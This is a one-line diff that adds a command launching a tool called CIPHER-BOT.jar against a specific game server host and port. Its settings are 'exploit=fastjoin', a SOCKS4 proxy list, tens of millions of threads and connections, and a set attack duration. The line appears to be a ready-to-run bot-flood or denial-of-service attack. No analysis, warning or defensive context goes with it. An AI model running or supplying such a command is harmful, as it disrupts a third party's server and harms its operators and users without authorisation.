@@ -1,0 +1,1 @@
+java -jar CIPHER-BOT.jar host=stormplay.us.to port=31358 protocol=47 exploit=fastjoin proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=99999999 timeout=500 attackTime=5000 connections=9000000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true
